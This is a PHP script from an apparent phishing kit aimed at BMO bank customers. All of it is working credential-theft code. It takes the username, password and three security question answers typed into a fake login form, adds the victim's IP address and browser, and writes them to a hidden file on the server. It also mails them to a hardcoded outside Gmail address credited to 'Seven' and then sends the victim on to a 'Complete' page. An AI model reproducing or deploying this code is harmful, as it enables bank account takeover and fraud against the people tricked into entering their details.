<?php

error_reporting(0);

$send = "sarkolouty@gmail.com";

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 LoginDetails-------------------\n";
$message .= "username : ".$_POST['username']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "-----------------2 QuestionDetails----------------\n";
$message .= "Question	: ".$_POST['question1']."\n";
$message .= "Answer		: ".$_POST['answer1']."\n";
$message .= "Question	: ".$_POST['question2']."\n";
$message .= "Answer		: ".$_POST['answer2']."\n";
$message .= "Question	: ".$_POST['question3']."\n";
$message .= "Answer		: ".$_POST['answer3']."\n";
$message .= "-----------------created by Seven[723806851]---------------\n";
$message .= "IP          : ".$ip."\n";
$message .= "BROWSER     : ".$browser."\n";
$message .= "-----------------BMO Results----------------------\n";



$subject = "BMO - created by Seven[723806851] ";

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/ehtgdfh4w3.txt","a+");
fwrite($fp,"RBC - Seven[723806851]" . " | " .getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
fclose($fp);

mail($send , "BMO - Seven[723806851]", getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");


?>
<script>
    window.top.location.href = "Complete.php";

</script>